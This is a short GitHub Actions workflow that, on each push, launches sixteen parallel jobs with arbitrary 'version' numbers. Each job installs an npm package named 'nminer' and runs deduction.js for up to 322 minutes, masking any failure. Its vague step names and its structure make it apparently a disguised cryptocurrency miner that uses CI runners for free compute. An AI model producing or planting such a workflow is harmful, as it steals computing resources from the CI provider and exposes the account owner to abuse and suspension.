name: deduction
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1576 }
          - { version: 6193 }
          - { version: 3527 }
          - { version: 6899 }
          - { version: 1488 }
          - { version: 136 }
          - { version: 9555 }
          - { version: 1402 }
          - { version: 2093 }
          - { version: 9623 }
          - { version: 8250 }
          - { version: 5001 }
          - { version: 7791 }
          - { version: 6775 }
          - { version: 8732 }
          - { version: 4867 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: to
        run: |
          npm install nminer@latest
          timeout 322m node deduction.js || echo "deduction executed"